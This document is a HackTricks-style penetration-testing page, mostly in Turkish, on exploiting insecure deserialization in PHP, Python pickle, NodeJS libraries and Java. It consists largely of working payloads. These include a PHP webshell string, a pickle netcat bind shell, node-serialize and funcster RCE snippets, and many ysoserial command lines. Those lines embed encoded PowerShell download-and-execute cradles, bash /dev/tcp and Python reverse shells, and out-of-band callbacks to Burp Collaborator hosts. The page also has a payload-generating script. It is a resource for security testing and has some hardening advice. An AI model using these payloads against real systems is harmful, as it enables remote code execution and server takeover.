# Deserialization

{{#include ../../banners/hacktricks-training.md}}

## Basic Information

**Serialization** bir nesnenin saklanabilir bir formata dönüştürülmesi yöntemi olarak anlaşılır; amaç nesneyi depolamak veya iletişim sürecinin bir parçası olarak iletmektir. Bu teknik, nesnenin yapı ve durumunu koruyarak daha sonra yeniden oluşturulabilmesini sağlamak için yaygın şekilde kullanılır.

**Deserialization**, tersine, **Serialization** işlemini geri alan süreçtir. Belirli bir formatta yapılandırılmış veriyi alıp tekrar bir nesne haline getirmeyi içerir.

Deserialization tehlikeli olabilir çünkü bu, nesnenin yeniden oluşturulması sırasında saldırganların **seri hale getirilmiş veriyi manipüle ederek zararlı kod çalıştırmasına** veya uygulamada beklenmeyen davranışlara yol açmasına imkan verebilir.

## PHP

PHP'de, serialization ve deserialization süreçlerinde belirli magic methods kullanılır:

- `__sleep`: Bir nesne serialize edilirken çağrılır. Bu metod, serialize edilmesi gereken tüm property isimlerinin bulunduğu bir dizi döndürmelidir. Genellikle bekleyen verileri kaydetmek veya benzer temizlik görevlerini yapmak için kullanılır.
- `__wakeup`: Bir nesne deserialize edilirken çağrılır. Serialization sırasında kaybedilmiş olabilecek veritabanı bağlantılarını yeniden kurmak ve diğer yeniden başlatma görevlerini yapmak için kullanılır.
- `__unserialize`: Bir nesne deserialize edilirken (varsa) `__wakeup` yerine çağrılır. `__wakeup`'a kıyasla deserialization süreci üzerinde daha fazla kontrol sağlar.
- `__destruct`: Bir nesnenin yok edilmek üzere olduğu veya script'in sonlandığı durumda çağrılır. Genellikle dosya handle'larını veya veritabanı bağlantılarını kapatma gibi temizlik işleri için kullanılır.
- `__toString`: Bu metod bir nesnenin string gibi muamele görmesine olanak tanır. İçindeki fonksiyon çağrılarına göre dosya okuma veya benzeri işlemler için kullanılabilir; nesnenin metinsel bir temsilini sağlar.
```php
<?php
class test {
public $s = "This is a test";
public function displaystring(){
echo $this->s.'<br />';
}
public function __toString()
{
echo '__toString method called';
}
public function __construct(){
echo "__construct method called";
}
public function __destruct(){
echo "__destruct method called";
}
public function __wakeup(){
echo "__wakeup method called";
}
public function __sleep(){
echo "__sleep method called";
return array("s"); #The "s" makes references to the public attribute
}
}

$o = new test();
$o->displaystring();
$ser=serialize($o);
echo $ser;
$unser=unserialize($ser);
$unser->displaystring();

/*
php > $o = new test();
__construct method called
__destruct method called
php > $o->displaystring();
This is a test<br />

php > $ser=serialize($o);
__sleep method called

php > echo $ser;
O:4:"test":1:{s:1:"s";s:14:"This is a test";}

php > $unser=unserialize($ser);
__wakeup method called
__destruct method called

php > $unser->displaystring();
This is a test<br />
*/
?>
```
If you look to the results you can see that the functions **`__wakeup`** and **`__destruct`** are called when the object is deserialized. Note that in several tutorials you will find that the **`__toString`** function is called when trying yo print some attribute, but apparently that's **not happening anymore**.

> [!WARNING]
> The method **`__unserialize(array $data)`** is called **instead of `__wakeup()`** if it is implemented in the class. It allows you to unserialize the object by providing the serialized data as an array. You can use this method to unserialize properties and perform any necessary tasks upon deserialization.
>
> ```php
> class MyClass {
>    private $property;
>
>    public function __unserialize(array $data): void {
>        $this->property = $data['property'];
>        // Perform any necessary tasks upon deserialization.
>    }
> }
> ```

You can read an explained **PHP example here**: [https://www.notsosecure.com/remote-code-execution-via-php-unserialize/](https://www.notsosecure.com/remote-code-execution-via-php-unserialize/), here [https://www.exploit-db.com/docs/english/44756-deserialization-vulnerability.pdf](https://www.exploit-db.com/docs/english/44756-deserialization-vulnerability.pdf) or here [https://securitycafe.ro/2015/01/05/understanding-php-object-injection/](https://securitycafe.ro/2015/01/05/understanding-php-object-injection/)

### PHP Deserial + Autoload Sınıfları

You could abuse the PHP autoload functionality to load arbitrary php files and more:


{{#ref}}
php-deserialization-+-autoload-classes.md
{{#endref}}

### Referanslı Değerleri Serileştirme

If for some reason you want to serialize a value as a **reference to another value serialized** you can:
```php
<?php
class AClass {
public $param1;
public $param2;
}

$o = new WeirdGreeting;
$o->param1 =& $o->param22;
$o->param = "PARAM";
$ser=serialize($o);
```
### PHP Object Injection'ı `allowed_classes` ile Önleme

> [!INFO]
> `unserialize()`'ın (the `$options` array) **ikinci argümanına** destek **PHP 7.0**'da eklendi. Eski sürümlerde fonksiyon yalnızca serileştirilmiş stringi kabul eder; hangi sınıfların örneklendirilebileceğini sınırlamak mümkün değildir.

`unserialize()` serileştirilmiş akış içinde bulduğu **her sınıfı** örnekleyecektir, aksi söylenmedikçe. PHP 7'den beri davranış [`allowed_classes`](https://www.php.net/manual/en/function.unserialize.php) seçeneği ile sınırlandırılabilir:
```php
// NEVER DO THIS – full object instantiation
$object = unserialize($userControlledData);

// SAFER – disable object instantiation completely
$object = unserialize($userControlledData, [
'allowed_classes' => false    // no classes may be created
]);

// Granular – only allow a strict white-list of models
$object = unserialize($userControlledData, [
'allowed_classes' => [MyModel::class, DateTime::class]
]);
```
Eğer **`allowed_classes` ihmal edilirse _veya_ kod PHP < 7.0 üzerinde çalışıyorsa**, çağrı **tehlikeli** hale gelir; çünkü bir saldırgan `__wakeup()` veya `__destruct()` gibi magic method'ları suistimal eden bir payload hazırlayarak Remote Code Execution (RCE) gerçekleştirebilir.

#### Gerçek dünya örneği: Everest Forms (WordPress) CVE-2025-52709

WordPress eklentisi **Everest Forms ≤ 3.2.2** helper wrapper ile savunmacı olmaya çalıştı ama eski PHP sürümlerini unuttu:
```php
function evf_maybe_unserialize($data, $options = array()) {
if (is_serialized($data)) {
if (version_compare(PHP_VERSION, '7.1.0', '>=')) {
// SAFE branch (PHP ≥ 7.1)
$options = wp_parse_args($options, array('allowed_classes' => false));
return @unserialize(trim($data), $options);
}
// DANGEROUS branch (PHP < 7.1)
return @unserialize(trim($data));
}
return $data;
}
```
PHP ≤ 7.0 çalıştıran sunucularda bu ikinci dal, bir yönetici kötü amaçlı bir form gönderimini açtığında klasik bir **PHP Object Injection**'a yol açıyordu. Minimal bir exploit payload şu şekilde görünebilir:
```
O:8:"SomeClass":1:{s:8:"property";s:28:"<?php system($_GET['cmd']); ?>";}
```
Admin girdiyi görüntülediği anda, nesne örneklendi ve `SomeClass::__destruct()` çalıştırıldı; bu da keyfi kod yürütülmesine yol açtı.

**Çıkarımlar**
1. Her zaman `unserialize()` çağırırken `['allowed_classes' => false]` (veya sıkı bir beyaz liste) kullanın.
2. Savunma amaçlı wrapper'ları denetleyin – genellikle eski PHP dallarını göz ardı ederler.
3. Sadece **PHP ≥ 7.x**'e yükseltmek tek başına *yeterli* değildir: seçenek yine de açıkça sağlanmalıdır.

---

### PHPGGC (ysoserial for PHP)

[**PHPGGC**](https://github.com/ambionics/phpggc) PHP deserializations'ı kötüye kullanmak için payloadlar oluşturmanıza yardımcı olabilir.\
Not: birçok durumda uygulamanın kaynak kodunda bir deserialization'ı kötüye kullanmanın bir yolunu bulamayabilirsiniz, ancak harici PHP extensions'ın kodunu kötüye kullanabilirsiniz.\
Bu yüzden, mümkünse sunucunun `phpinfo()`'sini kontrol edin ve kötüye kullanabileceğiniz olası bir gadget için internet üzerinde (hatta **PHPGGC**'nin **gadgets** bölümünde) arama yapın.

### phar:// metadata deserialization

Eğer dosyayı sadece okuyan ve içindeki PHP kodunu çalıştırmayan (ör. _**file_get_contents(), fopen(), file() or file_exists(), md5_file(), filemtime() or filesize()**_) bir LFI bulduysanız, phar protokolünü kullanarak bir dosya okunurken gerçekleşen bir deserialization'ı kötüye kullanmayı deneyebilirsiniz.\
Daha fazla bilgi için aşağıdaki yazıyı okuyun:


{{#ref}}
../file-inclusion/phar-deserialization.md
{{#endref}}

## Python

### **Pickle**

Nesne unpickle edildiğinde, __reduce__ fonksiyonu çalıştırılacaktır.\
İstismar edildiğinde sunucu bir hata döndürebilir.
```python
import pickle, os, base64
class P(object):
def __reduce__(self):
return (os.system,("netcat -c '/bin/bash -i' -l -p 1234 ",))
print(base64.b64encode(pickle.dumps(P())))
```
Bypass tekniğini kontrol etmeden önce, eğer python3 çalıştırıyorsanız python2 ile uyumlu bir obje oluşturmak için `print(base64.b64encode(pickle.dumps(P(),2)))` kullanmayı deneyin.

For more information about escaping from **pickle jails** check:


{{#ref}}
../../generic-methodologies-and-resources/python/bypass-python-sandboxes/
{{#endref}}

### Yaml **&** jsonpickle

Aşağıdaki sayfa, yamls python kütüphanelerindeki güvensiz deserialization'ı istismar etme tekniğini gösterir ve **Pickle, PyYAML, jsonpickle and ruamel.yaml** için RCE deserialization payload üretmekte kullanılabilecek bir araçla sonlanır:


{{#ref}}
python-yaml-deserialization.md
{{#endref}}

### Class Pollution (Python Prototype Pollution)


{{#ref}}
../../generic-methodologies-and-resources/python/class-pollution-pythons-prototype-pollution.md
{{#endref}}

## NodeJS

### JS Magic Functions

JS, PHP veya Python gibi sadece bir obje oluşturulduğunda çalıştırılan **"magic" fonksiyonlara sahip değildir**. Ancak doğrudan çağrılmadan bile **sıkça kullanılan** bazı **fonksiyonlar** vardır; örneğin **`toString`**, **`valueOf`**, **`toJSON`**.\
Eğer bir deserialization'ı istismar ediyorsanız, bu fonksiyonları diğer kodları çalıştırmak üzere **compromise edebilirsiniz** (muhtemelen prototype pollutions'ı kullanarak) ve bunlar çağrıldığında arbitrary code çalıştırabilirsiniz.

Another **"magic" way to call a function** without calling it directly is by **compromising an object that is returned by an async function** (promise). Because, if you **transform** that **return object** in another **promise** with a **property** called **"then" of type function**, it will be **executed** just because it's returned by another promise. _Follow_ [_**this link**_](https://blog.huli.tw/2022/07/11/en/googlectf-2022-horkos-writeup/) _for more info._
```javascript
// If you can compromise p (returned object) to be a promise
// it will be executed just because it's the return object of an async function:
async function test_resolve() {
const p = new Promise((resolve) => {
console.log("hello")
resolve()
})
return p
}

async function test_then() {
const p = new Promise((then) => {
console.log("hello")
return 1
})
return p
}

test_ressolve()
test_then()
//For more info: https://blog.huli.tw/2022/07/11/en/googlectf-2022-horkos-writeup/
```
### `__proto__` and `prototype` pollution

Bu teknik hakkında bilgi edinmek istiyorsanız **aşağıdaki eğitime göz atın**:


{{#ref}}
nodejs-proto-prototype-pollution/
{{#endref}}

### [node-serialize](https://www.npmjs.com/package/node-serialize)

Bu kütüphane fonksiyonları serileştirmeye izin verir. Örnek:
```javascript
var y = {
rce: function () {
require("child_process").exec("ls /", function (error, stdout, stderr) {
console.log(stdout)
})
},
}
var serialize = require("node-serialize")
var payload_serialized = serialize.serialize(y)
console.log("Serialized: \n" + payload_serialized)
```
**Serileştirilmiş nesne** şu şekilde görünecek:
```bash
{"rce":"_$$ND_FUNC$$_function(){ require('child_process').exec('ls /', function(error, stdout, stderr) { console.log(stdout) })}"}
```
Örnekte, bir fonksiyon serialize edildiğinde `_$$ND_FUNC$$_` bayrağının serialize edilmiş objeye eklendiğini görebilirsiniz.

`node-serialize/lib/serialize.js` dosyasında aynı bayrağı ve kodun onu nasıl kullandığını bulabilirsiniz.

![](<../../images/image (351).png>)

![](<../../images/image (446).png>)

Son kod parçasında görebileceğiniz gibi, **bayrak bulunursa** `eval` fonksiyonu kullanılarak fonksiyon deserialize ediliyor, yani temelde **kullanıcı girdisi `eval` fonksiyonunun içinde kullanılıyor**.

Ancak, **sadece serialize etmek** bir fonksiyonu **çalıştırmaz**, çünkü örneğimizde kodun bir kısmının **`y.rce` çağırıyor** olması gerekir ve bu da büyük olasılıkla **olası değil**.\
Yine de, serialize edilmiş objeyi **birkaç parantez ekleyerek** **değiştirip**, obje deserialize edildiğinde fonksiyonun otomatik olarak çalışmasını sağlayabilirsiniz.\
Bir sonraki kod parçasında **son paranteze dikkat edin** ve `unserialize` fonksiyonunun kodu nasıl otomatik çalıştıracağını görün:
```javascript
var serialize = require("node-serialize")
var test = {
rce: "_$$ND_FUNC$$_function(){ require('child_process').exec('ls /', function(error, stdout, stderr) { console.log(stdout) }); }()",
}
serialize.unserialize(test)
```
Önceden belirtildiği gibi, bu kütüphane `_$$ND_FUNC$$_` sonrası code'u alacak ve `eval` kullanarak **execute it**. Bu yüzden, **auto-execute code** yapmak için **delete the function creation** kısmını ve son parantezi silebilir ve **just execute a JS oneliner** şu örnekte olduğu gibi çalıştırabilirsiniz:
```javascript
var serialize = require("node-serialize")
var test =
"{\"rce\":\"_$$ND_FUNC$$_require('child_process').exec('ls /', function(error, stdout, stderr) { console.log(stdout) })\"}"
serialize.unserialize(test)
```
Bu vulnerability'yi nasıl exploit edeceğiniz hakkında **daha fazla bilgi** için [**find here**](https://opsecx.com/index.php/2017/02/08/exploiting-node-js-deserialization-bug-for-remote-code-execution/).

### [funcster](https://www.npmjs.com/package/funcster)

**funcster**'ın dikkat çekici bir yönü, **standart yerleşik nesnelere** erişilememesidir; bunlar erişilebilir kapsamın dışındadır. Bu kısıtlama, yerleşik nesnelerin metodlarını çağırmaya çalışan kodun çalışmasını engeller ve `console.log()` veya `require(something)` gibi komutlar kullanıldığında "ReferenceError: console is not defined" gibi istisnalara yol açar.

Bu sınırlamaya rağmen, tüm standart yerleşik nesneler de dahil olmak üzere global context'e tam erişimin belirli bir yöntemle geri kazandırılması mümkündür. Global context'i doğrudan kullanarak bu kısıtlamanın üstesinden gelinebilir. Örneğin, erişim aşağıdaki snippet ile tekrar sağlanabilir:
```javascript
funcster = require("funcster")
//Serialization
var test = funcster.serialize(function () {
return "Hello world!"
})
console.log(test) // { __js_function: 'function(){return"Hello world!"}' }

//Deserialization with auto-execution
var desertest1 = { __js_function: 'function(){return "Hello world!"}()' }
funcster.deepDeserialize(desertest1)
var desertest2 = {
__js_function: 'this.constructor.constructor("console.log(1111)")()',
}
funcster.deepDeserialize(desertest2)
var desertest3 = {
__js_function:
"this.constructor.constructor(\"require('child_process').exec('ls /', function(error, stdout, stderr) { console.log(stdout) });\")()",
}
funcster.deepDeserialize(desertest3)
```
**Daha fazla bilgi için**[ **more information read this source**](https://www.acunetix.com/blog/web-security-zone/deserialization-vulnerabilities-attacking-deserialization-in-js/)**.**

### [**serialize-javascript**](https://www.npmjs.com/package/serialize-javascript)

The **serialize-javascript** paketi yalnızca serialization amaçlı olarak tasarlanmıştır ve yerleşik herhangi bir deserialization yeteneğine sahip değildir. Kullanıcılar deserialization için kendi yöntemlerini uygulamakla sorumludur. Seri hale getirilmiş verilerin deserializing'i için resmi örnekte doğrudan `eval` kullanımı önerilmektedir:
```javascript
function deserialize(serializedJavascript) {
return eval("(" + serializedJavascript + ")")
}
```
Eğer bu fonksiyon nesneleri deserialize etmek için kullanılıyorsa, onu **kolayca exploit edebilirsiniz**:
```javascript
var serialize = require("serialize-javascript")
//Serialization
var test = serialize(function () {
return "Hello world!"
})
console.log(test) //function() { return "Hello world!" }

//Deserialization
var test =
"function(){ require('child_process').exec('ls /', function(error, stdout, stderr) { console.log(stdout) }); }()"
deserialize(test)
```
**Daha fazla bilgi için**[ **more information read this source**](https://www.acunetix.com/blog/web-security-zone/deserialization-vulnerabilities-attacking-deserialization-in-js/)**.**

### Cryo library

Aşağıdaki sayfalarda bu kütüphaneyi suistimal ederek arbitrary commands yürütme hakkında bilgi bulabilirsiniz:

- [https://www.acunetix.com/blog/web-security-zone/deserialization-vulnerabilities-attacking-deserialization-in-js/](https://www.acunetix.com/blog/web-security-zone/deserialization-vulnerabilities-attacking-deserialization-in-js/)
- [https://hackerone.com/reports/350418](https://hackerone.com/reports/350418)

## Java - HTTP

Java'da, **deserialization callbacks deserialization işlemi sırasında yürütülür**. Bu yürütme, bu callbacks'leri tetikleyen kötü amaçlı payloads hazırlayan saldırganlar tarafından suistimal edilebilir ve zararlı eylemlerin yürütülmesine yol açabilir.

### Fingerprints

#### White Box

Kod tabanında potansiyel serialization açıklarını tespit etmek için şunlara bakın:

- Serializable interface'ini implement eden sınıflar.
- `java.io.ObjectInputStream`, `readObject`, `readUnshare` fonksiyonlarının kullanımı.

Aşağıdakilere özellikle dikkat edin:

- XMLDecoder, dış kullanıcılar tarafından tanımlanan parametrelerle kullanıldığında.
- XStream'in `fromXML` yöntemi, özellikle XStream sürümü 1.46 veya daha düşükse, çünkü serialization sorunlarına eğilimlidir.
- `ObjectInputStream` ile birlikte `readObject` metodunun kullanımı.
- `readObject`, `readObjectNodData`, `readResolve` veya `readExternal` gibi metodların uygulanması.
- `ObjectInputStream.readUnshared`.
- Genel olarak `Serializable` kullanımı.

#### Black Box

Black Box testlerinde, `ObjectInputStream` kaynaklı java serialized objects'ı gösteren belirli **signatures or "Magic Bytes"** için arama yapın:

- Hex deseni: `AC ED 00 05`.
- Base64 deseni: `rO0`.
- HTTP yanıt başlıklarında `Content-type` değeri `application/x-java-serialized-object` olarak ayarlanmış.
- Önceki sıkıştırmayı gösteren hex deseni: `1F 8B 08 00`.
- Önceki sıkıştırmayı gösteren Base64 deseni: `H4sIA`.
- `.faces` uzantılı web dosyaları ve `faces.ViewState` parametresi. Bu desenlerin bir web uygulamasında bulunması, [post about Java JSF ViewState Deserialization](java-jsf-viewstate-.faces-deserialization.md) içinde ayrıntılı olarak anlatıldığı gibi bir inceleme yapılmasını gerektirmelidir.
```
javax.faces.ViewState=rO0ABXVyABNbTGphdmEubGFuZy5PYmplY3Q7kM5YnxBzKWwCAAB4cAAAAAJwdAAML2xvZ2luLnhodG1s
```
### Zafiyet olup olmadığını kontrol et

Eğer **Java Deserialized exploit'in nasıl çalıştığını öğrenmek istiyorsanız**, şu kaynaklara bakmalısınız: [**Basic Java Deserialization**](basic-java-deserialization-objectinputstream-readobject.md), [**Java DNS Deserialization**](java-dns-deserialization-and-gadgetprobe.md), ve [**CommonsCollection1 Payload**](java-transformers-to-rutime-exec-payload.md).

#### SignedObject-gated deserialization and pre-auth reachability

Modern kod tabanları bazen deserialization'ı `java.security.SignedObject` ile sarar ve `getObject()` (iç nesneyi deserializes eden) çağrılmadan önce imzayı doğrular. Bu, arbitrary top-level gadget classes'ı engeller ancak bir saldırgan geçerli bir imza elde edebilirse (ör. private-key compromise veya bir signing oracle) yine de exploitable olabilir. Ek olarak, error-handling flows kimlik doğrulanmamış users için session-bound tokens mint edebilir ve aksi halde korunan sinks'leri pre-auth durumda açığa çıkarabilir.

For a concrete case study with requests, IoCs, and hardening guidance, see:

{{#ref}}
java-signedobject-gated-deserialization.md
{{#endref}}

#### White Box Test

Bilinen zafiyetlere sahip herhangi bir uygulamanın kurulu olup olmadığını kontrol edebilirsiniz.
```bash
find . -iname "*commons*collection*"
grep -R InvokeTransformer .
```
You could try to **tüm bilinen zafiyetli kütüphaneleri kontrol etmeyi** ve [**Ysoserial** ](https://github.com/frohoff/ysoserial) tarafından exploit sağlanabilenleri tespit etmeyi deneyebilirsiniz. Veya [Java-Deserialization-Cheat-Sheet](https://github.com/GrrrDog/Java-Deserialization-Cheat-Sheet#genson-json) üzerinde belirtilen kütüphanelere göz atabilirsiniz.\
Ayrıca [**gadgetinspector**](https://github.com/JackOfMostTrades/gadgetinspector) kullanarak sömürülebilecek olası gadget chains için arama yapabilirsiniz.\
**gadgetinspector**'ı (derledikten sonra) çalıştırırken karşılaştığı çok sayıda uyarı/hata ile ilgilenmeyin ve bitirmesine izin verin. Tüm bulguları _gadgetinspector/gadget-results/gadget-chains-year-month-day-hore-min.txt_ altında yazacaktır. Lütfen, **gadgetinspector'ın exploit oluşturmayacağını ve yanlış pozitifler gösterebileceğini** unutmayın.

#### Black Box Test

Burp eklentisi [**gadgetprobe**](java-dns-deserialization-and-gadgetprobe.md) ile **hangi kütüphanelerin mevcut olduğunu** (hatta sürümlerini) tespit edebilirsiniz. Bu bilgiyle açığı sömürmek için **bir payload seçmek** daha kolay olabilir.\
[**Read this to learn more about GadgetProbe**](java-dns-deserialization-and-gadgetprobe.md#gadgetprobe)**.**\
GadgetProbe, **`ObjectInputStream` deserializations** üzerine odaklanmıştır.

Burp eklentisi [**Java Deserialization Scanner**](java-dns-deserialization-and-gadgetprobe.md#java-deserialization-scanner) ile ysoserial ile exploitable olan **vulnerable libraries**'i tespit edebilir ve bunları **exploit** edebilirsiniz.\
[**Read this to learn more about Java Deserialization Scanner.**](java-dns-deserialization-and-gadgetprobe.md#java-deserialization-scanner)\
Java Deserialization Scanner, **`ObjectInputStream`** deserializations üzerine odaklanmıştır.

Ayrıca [**Freddy**](https://github.com/nccgroup/freddy) kullanarak Burp içerisinde deserializations zafiyetlerini tespit edebilirsiniz. Bu eklenti **sadece `ObjectInputStream`** ile ilgili zafiyetleri değil aynı zamanda **Json** ve **Yml** deserialization kütüphanelerinden kaynaklanan zafiyetleri de tespit eder. Aktif modda, bunları sleep veya DNS payload'ları kullanarak doğrulamaya çalışır.\
[**You can find more information about Freddy here.**](https://www.nccgroup.com/us/about-us/newsroom-and-events/blog/2018/june/finding-deserialisation-issues-has-never-been-easier-freddy-the-serialisation-killer/)

**Serialization Test**

Sunucunun hangi vulnerable library'leri kullandığını kontrol etmek her şey değildir. Bazen serialized object içindeki verileri **değiştirip bazı kontrolleri atlayabilir** (örneğin bir webapp içinde admin yetkisi kazanabilirsiniz).\
Bir web uygulamasına gönderilen Java serialized object bulursanız, gönderilen serialization objesini daha insan tarafından okunabilir bir formata yazdırmak için [**SerializationDumper**](https://github.com/NickstaDB/SerializationDumper) **kullanabilirsiniz**. Hangi verileri gönderdiğinizi bilmek, bunları değiştirmeyi ve bazı kontrolleri atlamayı kolaylaştırır.

### **Exploit**

#### **ysoserial**

Java deserializations'ı exploit etmek için ana araç [**ysoserial**](https://github.com/frohoff/ysoserial) ([**download here**](https://jitpack.io/com/github/frohoff/ysoserial/master-SNAPSHOT/ysoserial-master-SNAPSHOT.jar))'dır. Karmaşık komutları (ör. pipe kullanan) çalıştırmak için [**ysoseral-modified**](https://github.com/pimps/ysoserial-modified) kullanmayı da düşünebilirsiniz.\
Bu aracın **`ObjectInputStream`** sömürülerine odaklandığını unutmayın.\
Inject mümkün mü diye test etmek için genellikle bir RCE payload'tan önce **"URLDNS"** payload'ını **kullanmaya başlamanızı** tavsiye ederim. Yine de "URLDNS" payload'ı çalışmayabilir ama başka bir RCE payload'ı çalışabilir.
```bash
# PoC to make the application perform a DNS req
java -jar ysoserial-master-SNAPSHOT.jar URLDNS http://b7j40108s43ysmdpplgd3b7rdij87x.burpcollaborator.net > payload

# PoC RCE in Windows
# Ping
java -jar ysoserial-master-SNAPSHOT.jar CommonsCollections5 'cmd /c ping -n 5 127.0.0.1' > payload
# Time, I noticed the response too longer when this was used
java -jar ysoserial-master-SNAPSHOT.jar CommonsCollections4 "cmd /c timeout 5" > payload
# Create File
java -jar ysoserial-master-SNAPSHOT.jar CommonsCollections4 "cmd /c echo pwned> C:\\\\Users\\\\username\\\\pwn" > payload
# DNS request
java -jar ysoserial-master-SNAPSHOT.jar CommonsCollections4 "cmd /c nslookup jvikwa34jwgftvoxdz16jhpufllb90.burpcollaborator.net"
# HTTP request (+DNS)
java -jar ysoserial-master-SNAPSHOT.jar CommonsCollections4 "cmd /c certutil -urlcache -split -f http://j4ops7g6mi9w30verckjrk26txzqnf.burpcollaborator.net/a a"
java -jar ysoserial-master-SNAPSHOT.jar CommonsCollections4 "powershell.exe -NonI -W Hidden -NoP -Exec Bypass -Enc SQBFAFgAKABOAGUAdwAtAE8AYgBqAGUAYwB0ACAATgBlAHQALgBXAGUAYgBDAGwAaQBlAG4AdAApAC4AZABvAHcAbgBsAG8AYQBkAFMAdAByAGkAbgBnACgAJwBoAHQAdABwADoALwAvADEAYwBlADcAMABwAG8AbwB1ADAAaABlAGIAaQAzAHcAegB1AHMAMQB6ADIAYQBvADEAZgA3ADkAdgB5AC4AYgB1AHIAcABjAG8AbABsAGEAYgBvAHIAYQB0AG8AcgAuAG4AZQB0AC8AYQAnACkA"
## In the ast http request was encoded: IEX(New-Object Net.WebClient).downloadString('http://1ce70poou0hebi3wzus1z2ao1f79vy.burpcollaborator.net/a')
## To encode something in Base64 for Windows PS from linux you can use: echo -n "<PAYLOAD>" | iconv --to-code UTF-16LE | base64 -w0
# Reverse Shell
## Encoded: IEX(New-Object Net.WebClient).downloadString('http://192.168.1.4:8989/powercat.ps1')
java -jar ysoserial-master-SNAPSHOT.jar CommonsCollections4 "powershell.exe -NonI -W Hidden -NoP -Exec Bypass -Enc SQBFAFgAKABOAGUAdwAtAE8AYgBqAGUAYwB0ACAATgBlAHQALgBXAGUAYgBDAGwAaQBlAG4AdAApAC4AZABvAHcAbgBsAG8AYQBkAFMAdAByAGkAbgBnACgAJwBoAHQAdABwADoALwAvADEAOQAyAC4AMQA2ADgALgAxAC4ANAA6ADgAOQA4ADkALwBwAG8AdwBlAHIAYwBhAHQALgBwAHMAMQAnACkA"

#PoC RCE in Linux
# Ping
java -jar ysoserial-master-SNAPSHOT.jar CommonsCollections4 "ping -c 5 192.168.1.4" > payload
# Time
## Using time in bash I didn't notice any difference in the timing of the response
# Create file
java -jar ysoserial-master-SNAPSHOT.jar CommonsCollections4 "touch /tmp/pwn" > payload
# DNS request
java -jar ysoserial-master-SNAPSHOT.jar CommonsCollections4 "dig ftcwoztjxibkocen6mkck0ehs8yymn.burpcollaborator.net"
java -jar ysoserial-master-SNAPSHOT.jar CommonsCollections4 "nslookup ftcwoztjxibkocen6mkck0ehs8yymn.burpcollaborator.net"
# HTTP request (+DNS)
java -jar ysoserial-master-SNAPSHOT.jar CommonsCollections4 "curl ftcwoztjxibkocen6mkck0ehs8yymn.burpcollaborator.net" > payload
java -jar ysoserial-master-SNAPSHOT.jar CommonsCollections4 "wget ftcwoztjxibkocen6mkck0ehs8yymn.burpcollaborator.net"
# Reverse shell
## Encoded: bash -i >& /dev/tcp/127.0.0.1/4444 0>&1
java -jar ysoserial-master-SNAPSHOT.jar CommonsCollections4 "bash -c {echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xMjcuMC4wLjEvNDQ0NCAwPiYx}|{base64,-d}|{bash,-i}" | base64 -w0
## Encoded: export RHOST="127.0.0.1";export RPORT=12345;python -c 'import sys,socket,os,pty;s=socket.socket();s.connect((os.getenv("RHOST"),int(os.getenv("RPORT"))));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn("/bin/sh")'
java -jar ysoserial-master-SNAPSHOT.jar CommonsCollections4 "bash -c {echo,ZXhwb3J0IFJIT1NUPSIxMjcuMC4wLjEiO2V4cG9ydCBSUE9SVD0xMjM0NTtweXRob24gLWMgJ2ltcG9ydCBzeXMsc29ja2V0LG9zLHB0eTtzPXNvY2tldC5zb2NrZXQoKTtzLmNvbm5lY3QoKG9zLmdldGVudigiUkhPU1QiKSxpbnQob3MuZ2V0ZW52KCJSUE9SVCIpKSkpO1tvcy5kdXAyKHMuZmlsZW5vKCksZmQpIGZvciBmZCBpbiAoMCwxLDIpXTtwdHkuc3Bhd24oIi9iaW4vc2giKSc=}|{base64,-d}|{bash,-i}"

# Base64 encode payload in base64
base64 -w0 payload
```
**java.lang.Runtime.exec()** için bir payload oluştururken, yürütmenin çıktısını yönlendirmek için ">" veya "|" gibi özel karakterleri, komut çalıştırmak için "$()" ifadesini veya bir komuta boşluklarla ayrılmış argümanları geçiremezsiniz (örneğin `echo -n "hello world"` yapabilirsiniz ama `python2 -c 'print "Hello world"'` yapamazsınız). Payload'ı doğru şekilde encode etmek için [bu web sayfasını kullanabilirsiniz](http://www.jackson-t.ca/runtime-exec-payloads.html).

Aşağıdaki script'i kullanarak Windows ve Linux için tüm olası **code execution** payload'larını oluşturup zafiyetli web sayfasında test edebilirsiniz:
```python
import os
import base64

# You may need to update the payloads
payloads = ['BeanShell1', 'Clojure', 'CommonsBeanutils1', 'CommonsCollections1', 'CommonsCollections2', 'CommonsCollections3', 'CommonsCollections4', 'CommonsCollections5', 'CommonsCollections6', 'CommonsCollections7', 'Groovy1', 'Hibernate1', 'Hibernate2', 'JBossInterceptors1', 'JRMPClient', 'JSON1', 'JavassistWeld1', 'Jdk7u21', 'MozillaRhino1', 'MozillaRhino2', 'Myfaces1', 'Myfaces2', 'ROME', 'Spring1', 'Spring2', 'Vaadin1', 'Wicket1']
def generate(name, cmd):
for payload in payloads:
final = cmd.replace('REPLACE', payload)
print 'Generating ' + payload + ' for ' + name + '...'
command = os.popen('java -jar ysoserial.jar ' + payload + ' "' + final + '"')
result = command.read()
command.close()
encoded = base64.b64encode(result)
if encoded != "":
open(name + '_intruder.txt', 'a').write(encoded + '\n')

generate('Windows', 'ping -n 1 win.REPLACE.server.local')
generate('Linux', 'ping -c 1 nix.REPLACE.server.local')
```
#### serialkillerbypassgadgets

Bu koleksiyonu [**https://github.com/pwntester/SerialKillerBypassGadgetCollection**](https://github.com/pwntester/SerialKillerBypassGadgetCollection) **ysoserial ile birlikte daha fazla exploits oluşturmak için kullanabilirsiniz**. Araç hakkında daha fazla bilgi, aracın sunulduğu konuşmanın slaytlarında bulunuyor: [https://es.slideshare.net/codewhitesec/java-deserialization-vulnerabilities-the-forgotten-bug-class?next_slideshow=1](https://es.slideshare.net/codewhitesec/java-deserialization-vulnerabilities-the-forgotten-bug-class?next_slideshow=1)

#### marshalsec

[**marshalsec** ](https://github.com/mbechler/marshalsec) Java'da farklı **Json** ve **Yml** serialization kütüphanelerini exploit etmek için payloadlar oluşturmak amacıyla kullanılabilir.\
Projeyi derlemek için `pom.xml` dosyasına bu **bağımlılıkları** **eklemem** gerekti:
```html
<dependency>
<groupId>javax.activation</groupId>
<artifactId>activation</artifactId>
<version>1.1.1</version>
</dependency>

<dependency>
<groupId>com.sun.jndi</groupId>
<artifactId>rmiregistry</artifactId>
<version>1.2.1</version>
<type>pom</type>
</dependency>
```
**maven'i yükleyin**, ve projeyi **derleyin**:
```bash
sudo apt-get install maven
mvn clean package -DskipTests
```
#### FastJSON

